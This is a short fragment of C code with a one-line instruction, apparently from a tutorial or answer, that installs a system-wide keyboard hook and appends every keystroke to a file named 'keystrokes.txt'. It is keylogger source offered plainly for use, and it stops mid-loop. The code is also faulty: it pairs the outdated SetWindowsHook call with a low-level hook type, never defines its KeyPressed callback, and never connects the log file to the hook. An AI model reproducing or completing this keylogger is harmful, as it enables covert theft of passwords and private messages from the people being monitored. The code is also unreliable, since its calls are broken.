Use `SetWindowsHook` to install a global keyboard hook. This will capture all keyboard events on the system.

```c
int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hhook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressed);

    // Open a file to store keystrokes
    FILE *file = fopen("keystrokes.txt", "a");
    if (!file) {
        printf("Could not create file.\n");
        return 1;
    }

    // Start a loop to wait for key events
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0) != -1) {
